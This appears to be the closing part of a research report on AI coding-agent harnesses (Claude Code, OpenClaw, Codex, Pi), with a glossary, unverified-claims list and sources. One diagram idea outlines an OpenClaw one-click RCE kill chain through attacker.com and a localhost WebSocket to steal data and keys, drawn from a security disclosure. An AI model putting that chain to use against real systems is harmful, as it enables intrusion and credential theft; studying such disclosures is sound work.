- Dynamic workflows / `ultracode` shipped (week 22, May 2026: "orchestrate large tasks with dynamic workflows") and matured enough by week 24 (June 2026) for subagents to nest their own subagents [S19].
- Cross-session messaging shipped week 32 (Aug 2026) — sessions you run yourself can now pass messages to each other without a formal "team" [S19].
- **Auto mode became the default permission mode** for interactive Claude Code sessions (week 32, per changelog; codified in current docs as "built-in starting permission mode... with Claude Code v2.1.283 or later") — a classifier model, not the user, approves most actions by default now, with tool results stripped from what the classifier sees to blunt prompt injection [S6][S19].
- Claude Code moved off its JS bundle to native binaries (week 16, April 2026) [S19].
- Default model lineage moved Sonnet 4.x → **Sonnet 5** (week 27) → alongside **Opus 5** (week 30) → a "Fable 5.1" switch referenced in week 36's changelog [S19].
- OpenClaw went through its entire public naming saga (Clawdbot → Moltbot → OpenClaw), its highest-severity disclosed CVE, and a round of provider-side access disputes with Anthropic (blocked then unblocked) — all inside a roughly 3-month window from late Jan to late April 2026, i.e., mostly just outside this "last 6 months" cut but its aftershocks (Foundation governance, OpenAI-as-donor, ClawHub, multi-harness plugin architecture) are the current state described above [S24][S25][S28][S29].
- The "harness matters more than the model" argument moved from single blog-post anecdote (mid-2026 endorlabs piece on Fable 5, per HN title) to a quantified, multi-harness, multi-model comparison with cost/KV-cache/token tables (aistack, Sept 2026) [S34].

## Diagram candidates

1. **Deep agent, four-part anatomy** — center: LLM tool loop; four labeled inputs feeding it: detailed system prompt, planning tool (dashed box, labeled "no-op"), sub-agent spawner, filesystem — per [S21].
2. **Claude Code context lifecycle** — timeline bar from session start (system prompt → CLAUDE.md → memory → skills index) through turns (file reads, hook firings) to `/compact` boundary, showing what survives (CLAUDE.md, invoked-skill bodies, last-5 files) vs what's summarized away — per [S7].
3. **Subagent vs agent team vs dynamic workflow**, three swimlanes showing where "the plan" lives (Claude's context / lead's context / script variables) and where results land — per [S14] table.
4. **Anthropic long-running-agent bootstrap loop** — a cycle diagram: initializer agent (once) → {read progress+features+git log → pick 1 feature → implement → test via browser automation → commit + update progress} (repeats) — per [S20].
5. **OpenClaw Gateway topology** — one Gateway box; arrows in from Clients (mac app/CLI/web) and Nodes (mobile/headless, with `role: node`); arrows out to Channels (WhatsApp/Telegram/Slack/...); a side box for the pluggable Agent Harness (Claude / Codex / Copilot SDK) — per [S26].
6. **OpenClaw RCE kill chain** — 6-step sequence diagram exactly as enumerated in §10, victim browser → attacker.com → localhost WS → API calls → `node.invoke` RCE — per [S28].
7. **Permission vs sandbox, two axes** — 2x2 or layered diagram showing "may it ask" (permission/approval policy) as one plane and "can the OS stop it" (Seatbelt/bubblewrap) as an orthogonal plane, instantiated three times (Claude Code, Codex, OpenClaw) — per [S15][S32][S26].
8. **Manus context-engineering loop** — action→observation→append→KV-cache-hit check, with the todo.md recitation arrow feeding back into "recent attention" — per [S30].
9. **Pi package dependency stack** — pi-ai → pi-agent-core → pi-coding-agent, with pi-durable and pi-tui as side dependencies, and OpenClaw shown as a downstream consumer — per [S27][S24].
10. **Claude Code subagent spawn-depth/concurrency caps** — a tree diagram, main agent at root, subagents nesting to depth 3 (default), with a concurrency gauge capped at 20 — per [S12].

## Chart candidates

1. **Resolve rate vs cost per harness** (bar or scatter): the aistack 6-row table above (harness × model → resolved/64, cost) — real numbers, [S34].
2. **Input/output token volume per harness/model** (grouped bar): same source, showing Claude Code consistently highest input tokens without higher resolve rate — [S34].
3. **KV-cache utilization (mean/p50/p90/max) per harness** — [S34] table 2, three harnesses × four percentile bands.
4. **Prefix-cache hit-rate regression**: Claude Code v2.1.233 (29.84% mean) vs Codex (96.58%) vs Pi (95.50%) on Qwen3.8-27B — a stark single-metric bar chart — [S34].
5. **Terminal-Bench 2.1 vs Terminal-Bench 4.0 for the same models** (Fable 5.1, GPT-6 Astra, SWE-2): shows the "long-horizon gap" Cognition itself names — [S35].
6. **Claude Code weekly changelog feature-release cadence**, 2026 weeks 13-37 — a timeline/Gantt of major features (native binary, agent view, dynamic workflows, cross-session messaging, auto-mode-default) — [S19], COMPOSED from the whats-new index.

## Glossary

- **Agentic harness**: the non-model machinery (tools, context management, execution environment) around an LLM that makes it an agent [S6].
- **Deep agent**: an agent loop augmented with a detailed prompt, a planning tool, sub-agents, and filesystem access [S21].
- **Subagent**: a worker agent with its own fresh context window, spawned and awaited (or backgrounded) by a parent session; returns only a summary [S2][S6].
- **Agent team**: multiple independent, peer Claude Code sessions with a shared task list and direct messaging, coordinated by a "team lead" session [S8].
- **Dynamic workflow**: a script (JS) that orchestrates many subagents outside the conversation's context window, executed by a runtime rather than turn-by-turn by the model [S14].
- **Compaction**: automatic summarization of conversation history when the context window nears its limit [S6].
- **Checkpoint**: a per-turn snapshot of file-tool edits enabling local `/rewind` [S9].
- **Verification loop**: a runnable check (tests/build/screenshot diff) an agent iterates against instead of self-declaring done [S6].
- **Initializer agent / coding agent**: Anthropic's two-role split for long-running work — one-time environment setup vs. repeated incremental-progress sessions [S20].
- **Sandbox mode vs approval/permission policy**: what a process can technically touch (OS-enforced) vs when the agent must ask a human/classifier first [S15][S32].
- **Gateway** (OpenClaw): the single long-lived daemon owning all channel/session state and exposing a typed WebSocket API [S26].
- **ClawHub**: OpenClaw's skill/plugin marketplace [S26].
- **KV-cache hit rate**: fraction of context tokens served from cached prefix computation rather than recomputed; central cost/latency lever for agent loops [S30].
- **Recitation**: rewriting a running summary/todo list into the end of context specifically to bias model attention back toward the goal [S30].
- **Ultracode**: Claude Code's keyword/effort-level trigger for writing and running a dynamic workflow [S14].

## Unverified / open questions

- **Cursor's actual agent/harness architecture** (planning, context management, subagent/background-agent internals): attempted via `docs.cursor.com` and `cursor.com/blog` — the fetched Composer 2.5 post (2026-05-18-dated launch, RL training details) contains **no harness-architecture content**, only model-training methodology (KV-cache-adjacent RL credit-assignment, reward hacking anecdotes). No primary Cursor architecture doc was successfully retrieved in this session; the task's claim of "published harness learnings" from Cursor is **not verified here** and should be retried with a working web-search tool or a direct fetch of `cursor.com/blog/context-diet`-style specific slugs if they exist. Flagging rather than fabricating.
- **Terminal-Bench full current leaderboard** (exact per-row model/agent/score for TB 4.0): the official site (`tbench.ai`) is a JS-rendered SPA that neither `curl` nor `WebFetch` could extract structured rows from; only third-party citations (Ante harness page, tokenstead SWE-2 card) were obtained, and those are self-reported/third-party, not the primary leaderboard table itself.
- **"Claude Code refuses requests or charges extra if your commits mention 'OpenClaw'"** (HN 2026-04-30, 1349 pts): sourced only via HN Algolia metadata pointing to a tweet; the tweet itself and any Anthropic confirmation/denial were not fetched. Treat as an unverified community claim, not a confirmed policy.
- **"OpenClaw (ClawdBot) joins OpenAI"** (HN 2026-02-15, tweet source): consistent with OpenAI later appearing as a named donor to the OpenClaw Foundation (which the README explicitly says is "a donor, not an owner" [S24]), but the tweet itself wasn't opened — the *donor* relationship is verified via the README; the stronger "joins OpenAI" framing is not.
- **YC talk "Why the Harness Matters More Than the Model"** (Sept 2026, HN, multiple reposts): video content not transcribed/verified in this pass; used only as evidence that the framing is prominent in the discourse, not as a numbers source.
- **Amp, OpenCode as harnesses in their own right**: HN search surfaced Amp's `AGENT.md` "universal agent configuration file" concept and general "which coding agent" discussion threads, but no primary architecture document for either was fetched — out of time budget for this pass. Worth a follow-up fetch of `ampcode.com/AGENT.md` and `ampcode.com/agents-for-the-agent` directly.
- **Exact ship date for Claude Code "agent teams"**: current docs describe it fully but no changelog week in the fetched whats-new sample explicitly announces its launch; likely between weeks not sampled here (e.g., weeks 17-19 or 23-31 not fully fetched).
- **LangChain "Managed Deep Agents v0.8"** (Sept 24 2026) and sibling posts (Deep Life Sci, Sept 17; Connections, Sept 9): titles/dates/authors confirmed from the source blog's own "related content" teaser list [S21], but the posts' bodies were not individually fetched — treat only the existence/date/author as verified, not their content claims.

## Sources

- [S2] "Create custom subagents," Claude Code docs, Anthropic, n.d. (current as of access), https://code.claude.com/docs/en/sub-agents.md — accessed 2026-09-30
- [S6] "Glossary," Claude Code docs, Anthropic, n.d., https://code.claude.com/docs/en/glossary.md — accessed 2026-09-30
- [S7] "Explore the context window," Claude Code docs, Anthropic, n.d., https://code.claude.com/docs/en/context-window.md — accessed 2026-09-30
- [S8] "Orchestrate teams of Claude Code sessions," Claude Code docs, Anthropic, n.d., https://code.claude.com/docs/en/agent-teams.md — accessed 2026-09-30
- [S9] "Checkpointing," Claude Code docs, Anthropic, n.d., https://code.claude.com/docs/en/checkpointing.md — accessed 2026-09-30
- [S11] "How the agent loop works," Claude Agent SDK docs, Anthropic, n.d., https://code.claude.com/docs/en/agent-sdk/agent-loop.md — accessed 2026-09-30
- [S12] "Subagents in the SDK," Claude Agent SDK docs, Anthropic, n.d., https://code.claude.com/docs/en/agent-sdk/subagents.md — accessed 2026-09-30
- [S13] "Use Claude Code features in the SDK," Claude Agent SDK docs, Anthropic, n.d., https://code.claude.com/docs/en/agent-sdk/claude-code-features.md — accessed 2026-09-30
- [S14] "Orchestrate subagents at scale with dynamic workflows," Claude Code docs, Anthropic, n.d., https://code.claude.com/docs/en/workflows.md — accessed 2026-09-30
- [S15] "Configure the sandboxed Bash tool," Claude Code docs, Anthropic, n.d., https://code.claude.com/docs/en/sandboxing.md — accessed 2026-09-30
- [S19] "What's new" weekly digest, Claude Code docs, Anthropic — specific weeks cited: w13, w14, w15, w16, w19, w20, w22, w23, w24, w27, w28, w30, w32, w33, w34, w35, w36, w37 (2026), https://code.claude.com/docs/en/whats-new/2026-w{NN}.md — accessed 2026-09-30
- [S20] Justin Young et al., "Effective harnesses for long-running agents," Anthropic Engineering blog, published 2025-11-26, https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents — accessed 2026-09-30
- [S21] Harrison Chase, "Deep Agents," LangChain blog ("Harrison's In the Loop"), published 2025-07-30, https://blog.langchain.com/deep-agents/ — accessed 2026-09-30 (page also shows related-post teasers dated 2026-09-24, 2026-09-17, 2026-09-09, titles/authors/dates only)
- [S23] "deepagents" README, langchain-ai/deepagents GitHub repository, n.d. (current), https://github.com/langchain-ai/deepagents (fetched via raw.githubusercontent.com) — accessed 2026-09-30
- [S24] "OpenClaw" README, openclaw/openclaw GitHub repository (redirect target of the original clawdbot/moltbot repo names), n.d. (current), https://github.com/openclaw/openclaw — accessed 2026-09-30
- [S25] Peter Steinberger, "Introducing OpenClaw," OpenClaw blog, published 2026-01-29, https://openclaw.ai/blog/introducing-openclaw — accessed 2026-09-30
- [S26] "Gateway architecture," OpenClaw Docs, n.d. (current, release notes visible up to v2026.9.6), https://docs.openclaw.ai/concepts/architecture — accessed 2026-09-30
- [S27] "Pi Agent Harness" README, earendil-works/pi GitHub repository, n.d. (current), https://github.com/earendil-works/pi (fetched via raw.githubusercontent.com) — accessed 2026-09-30
- [S28] Mav Levin, "1-Click RCE To Steal Your OpenClaw Data and Keys (CVE-2026-25253)," depthfirst blog, published 2026-02-01, https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys — accessed 2026-09-30
- [S29] Hacker News (Algolia search index), various story listings on "OpenClaw," "Clawdbot," "Moltbot," "harness matters," accessed via https://hn.algolia.com/api/v1/search — used only for dated headline/metadata corroboration (title, points, date, linked URL), not as full-text primary sources unless separately listed above — accessed 2026-09-30
- [S30] Yichao "Peak" Ji, "Context Engineering for AI Agents: Lessons from Building Manus," Manus blog, published 2025-07-18, https://manus.im/blog/Context-Engineering-for-AI-Agents-Lessons-from-Building-Manus — accessed 2026-09-30
- [S31] "Codex CLI" README, openai/codex GitHub repository, n.d. (current), https://github.com/openai/codex — accessed 2026-09-30
- [S32] "Agent approvals & security," OpenAI Codex documentation (learn.chatgpt.com), n.d. (current; references "GPT-6 Astra"), https://learn.chatgpt.com/docs/agent-approvals-security — accessed 2026-09-30
- [S33] "Config basics," OpenAI Codex documentation (learn.chatgpt.com), n.d. (current), https://learn.chatgpt.com/docs/config-file/config-basic — accessed 2026-09-30
- [S34] "Does your harness matter more than your model?," aistack, published September 2026, https://aistack.imec-int.com/blog/harness-cost — accessed 2026-09-30
- [S35] "SWE-2" model card, tokenstead, referenced/discussed on HN 2026-09-10, https://tokenstead.ai/models/swe-2 — accessed 2026-09-30
- [S36] "Terminal-Bench 2.1" leaderboard ("Ante" harness comparison), antigma.ai, updated 2026-09-14 per page text, https://antigma.ai/eval — accessed 2026-09-30
- [S37] "Terminal-Bench" overview, tbench.ai (hosted by Stanford/Harbor/Laude Institute), n.d. (current, "Terminal-Bench 4.0"), https://www.tbench.ai/ — accessed 2026-09-30 (partial content only — JS-rendered leaderboard rows not retrieved)
